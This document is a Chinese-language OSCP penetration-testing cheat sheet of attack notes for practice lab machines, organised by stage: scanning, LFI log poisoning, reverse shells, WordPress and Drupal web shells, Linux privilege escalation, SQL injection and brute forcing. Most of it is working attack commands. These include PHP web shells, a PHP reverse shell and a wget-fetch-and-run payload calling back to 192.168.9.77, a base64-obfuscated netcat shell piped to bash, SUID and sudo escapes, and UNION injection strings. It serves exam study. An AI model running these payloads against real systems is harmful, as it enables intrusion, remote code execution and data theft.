# OSCP
**目录扫描**
1. nikto
2. dirb
  a. dirb http:// IP or URL
  b. dirb http:// IP or URL -X .php,.txt -指定后缀名
3. dirbuster
4. robots.txt文件

**LFI**
1. ssh可访问日志: /var/log/auth.log。用ssh ‘<?php system($_GET[‘csd’]);?>’来上传一句话木马来反弹shell。
2. Nginx的可访问日志位置/var/log/nginx/access.log，用Burp上传一句话木马<?php system($_GET[‘cmd’]);?>
3. Apache access and error logs (/var/log/apache2/access.log and /var/log/apache2/error.log).

**反弹shell**
1. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
2.php-reverse-shell.php - 修改ip和port

**Wordpress:**
1. wpscan扫描插件 + searchsploit
2. Themes --> Editior --> 找个可以修改的php
3. Plugins -> Add New -> this page

**Drupal**
1. 安装php包(https://www.drupal.org/project/php)
2. 下载好后在Extend下安装PHP模板
3. 安装成功后激活模板
4. 创建php页面来反弹shell

**weevly（IMF靶机）**
1. weevly generate 1234 shell.php
2. weevly http://xxx.xxx.xxx.xxx/.../.../shell.php 1234

**PHPLiteAdmin**
1. 在test_db.php下创建一个数据库，然后再创建一个表格，上传php代码，即可被执行
2. 创建了一个csd的数据库，再在数据库下传教一个表格。然后在value下写入php代码。这里先采用了exp中的<?php phpinfo()?>进行尝试。写入成功后，用之前的文件包含漏洞访问csd.php(文件具体位置在数据库中可见)。
3. 先在kali机上进入/var/www/html目录，创建shell.txt文件。然后在shell.txt文件内写入<?php $sock=fsockopen("192.168.9.77",1234);exec("/bin/sh -i <&3 >&3 2>&3");?>
4. 修改Default Value，设置为<?php system("wget 192.168.9.77/shell.txt -O /tmp/shell.php;php /tmp/shell.php");?>

**哈希加密**
1. john工具：
  a. john --wordlist=xxx password.txt (指定字典)
  b. john password.txt --show
2. Crackstation：https://crackstation.net/
3. echo “xxxxx” | base64 -d
4. Argon2加密（Typo3）

**提权**
1. 查找suid
  a. find / -perm -u=s -type f 2>/dev/null
  b. find / -user root -perm -4000 -print 2>/dev/null
  c. find / -user root -perm -4000 -exec ls -ldb {} \
2. sudo权限
  a. sudo -l查看权限
  b. 查看相关sudo命令的用法
3. vim提权
  a. :set shell=/bin/bash
  b. :shell
4. nmap提权
  a. 交互式（有版本限制）
    1) --interactive进入交互式界面，
    2) !sh
  b. 利用脚本
    1) echo 'os.execute("/bin/sh")' > getShell
    2) sudo nmap --script=getShell
5. find提权
  a. find . -exec /bin/sh -p \; -quit
  b. find test -exec /bin/bash \;
6. gdb提权
  a. gdb -nx -ex 'python import os; os.setuid(0)' -ex '!bash' -ex quit
7. 利用定时任务crontab来提权
  a. 找到系统中会被root定时执行的脚本
  b. echo "Payload" > 脚本
  c. Kali开启监听，等待root执行反弹shell
8. 环境变量提权（Escalate_Linux）
  a. 查看可用脚本
  b. cd /tmp
  c. 根据要求写文件（例如echo “nc - c /bin/bash ” > ls）
  d. chmod 777 ls
  e. export PATH=/tmp:$PATH
  f. 执行脚本
9. Python提权：
  a. python -c ‘import os; os.system(“/bin/sh”)’
10. zip提权：
  a. 进入tmp目录，创建一个exploit文件
  b. sudo -u root zip /tmp/exploit.zip /tmp/exploit -T --unzip-command="sh -c /bin/bash"
11. 内核提权
  a. uname -a查看内核版本号
  b. searchsploit查找相关exp

**命令执行**
1. 绕过：
 a. 用单引号（例如c’a’t）
 b. echo + base64加密绕过：
 c. echo bmMgLWMgL2Jpbi9iYXNoIDE5Mi4xNjguOS43NyAxMjM0 |base64 -d | bash

**Web扫描**
1. joomla - joomscan
2. Wordiness - wpscan

**SQL注入**
1. sqlmap
  a. 一般模式：sqlmap - u “xxx” --dbs ---> sqlmap -u “xxx” -D x --tables ---> sqlmap -u “xxx” -D x -T x --columns ---> sqlmap -u “xxx” -D x -T x -C “x,y” --dump-all
  b. 带有session的：
      用Burp截包保存为本地文件（例如sql.txt）
      sqlmap -r sql.txt --dbs .... or sqlmap --cookie ID
2. 手工sql注入
  a. 用 ’ 或者 ’ 1=1 or(and) #(-- ) + ’ 1=2 or(and) #(-- )来判断是否有SQL注入
  b. unionselect语句
      1) Order by + 数字
      2) 若Order by 不成功则从1开始逐个尝试
      3) ' union select group_concat(schema_name),2,3,4,5,6 from information_schema.schemata#
      4) ' union select group_concat(table_name),2,3,4,5,6 from information_schema.tables where table_schema="xxx"# - 数据库名
      5) ' union select group_concat(table_name),2,3,4,5,6 from xxx.tables where table_schema="yyy"# - 表名
      6) ' union select group_concat(column_name),2,3,4,5,6 from information_schema.columns where table_name="zzz" - 表的内容
      7) ' union select group_concat(具体信息),2,3,4,5,6 from Staff.StaffDetails#

**爆破**
1. Burpsuite
2. rockyou.txt
3. cewl http://IP(URL) -w xxx.txt
4. hydra 
  hydra: hydra -L user.txt -P password.txt xxx.xxx.xxx.xxx(ip) ssh
  hydra -l otis -P /usr/share/wordlists/rockyou.txt 192.168.0.36 http-post-form '/monitoring/index.php:username=^USER^&PASSWORD=^PASS^&Login=Login:Sign In'
5. 模糊测试爆破目录wfuzz（psl1靶机里出现）
  wfuzz -c -w wordlist --hc 404 --hl 6(过滤) http://IP
6. fcrackzip工具尝试爆破压缩包密码
7. stegcracker可以爆破图片信息
8. steghide -u -D -p /usr/share/wordlist/rockyou.txt <filename>爆破图片隐写

**信息搜集**
1. 网页：	
2. 关键字
3. 源码
4. js脚本
5. OS
6. /home/目录下
7. /var/www/下

**杂项**
1. gpg解密(靶机Bob)
2. 跳转域名没法解析：修改/etc/hosts
3. 交互式界面python -c 'import pty; pty.spawn("/bin/bash")' 
4. 端口敲击开放filtered - /etc/knockd.conf
    nc IP port
    Nmap -r -p ports IP 
5. 图片
    base64解密生成图片（Fristileaks靶机里出现）
    下载下来查看备用信息
6. getcap -r / 2>/dev/null查看可用的capability
7. ssh -i id_rsa user@IP（ssh带密钥登录）
8. string读取二进制文件
9. crunch生成字典（TommyBoy靶机）
10。 file code（w34kn3ss）查看文件运用语言
11. uncompyle2/6 - python反编译
12. 查找特殊权限getcap -r / 2>/dev/null
13. Flask = Python + Werkzeug
14. Gobuster vhost 扫描域名。

**Mysql**
1. update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = 'sitemask'),''),'admin'))) where username = 'admin'; root用户修改密码。


















